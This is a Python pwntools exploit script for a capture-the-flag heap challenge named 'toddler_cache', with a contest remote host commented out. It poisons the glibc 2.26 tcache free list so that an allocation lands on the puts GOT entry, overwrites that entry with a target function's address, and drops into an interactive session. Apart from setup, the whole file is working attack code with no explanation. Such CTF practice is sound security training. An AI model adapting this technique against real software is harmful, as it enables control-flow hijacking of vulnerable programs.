from pwn import *
target=process(['/media/sf_kalishared/tools/itl-master/linkers/x64/ld-2.26.so','./toddler_cache'],env={"LD_PRELOAD":"./libc-2.26.so"})
#target=remote('cha.hackpack.club',41703)
print(target.recvuntil("> > "))
context.terminal=["tmux","split","-h"]
#gdb.attach(target,gdbscript="b *0x400c49")
#gdb.attach(target)

callme=0x400837
putsgot=0x602020

def create():
    target.sendline("1")
    print(target.recvuntil("> > "))

def write(index,data):
    target.sendline("2")
    print(target.recvuntil("> "))
    target.sendline(str(index))
    print(target.recvuntil("write?\n"))
    target.sendline(data)
    print(target.recvuntil("> > "))

def free(index):
    target.sendline("3")
    print(target.recvuntil("> > "))
    target.sendline(str(index))

def goodbye():
    target.sendline("4")
    print(target.recvuntil("Goodbye!"))

for i in range(12):
    create()

free(10)
free(9)
write(9,p64(putsgot))
create()
create()

target.sendline("2")
print(target.recvuntil("> "))
target.sendline(str(13))
print(target.recvuntil("write?\n"))
target.sendline(p64(callme))

target.interactive()
